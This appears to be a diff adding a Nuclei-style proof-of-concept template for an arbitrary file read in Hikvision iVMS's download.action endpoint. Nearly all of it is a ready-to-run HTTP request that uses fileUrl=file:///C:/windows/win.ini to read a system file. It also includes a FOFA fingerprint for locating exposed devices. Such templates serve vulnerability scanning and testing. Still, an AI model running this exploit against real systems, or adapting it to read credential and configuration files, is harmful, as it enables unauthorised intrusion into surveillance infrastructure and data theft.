@@ -1,0 +1,33 @@
+id: poc-vbknbwq99b9ygagi
+info:
+  name: 海康威视iVMS download.action存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vbknbwq99b9ygagi'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vbknbwq99b9ygagi
+    fofa: icon_hash="-911494769"
+http:
+- raw:
+  - 'GET /eps/triggerSnapshot/download.action?fileUrl=file:///C:/windows/win.ini HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: MicroMessenger
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Connection: close
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Cache-Control: max-age=0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
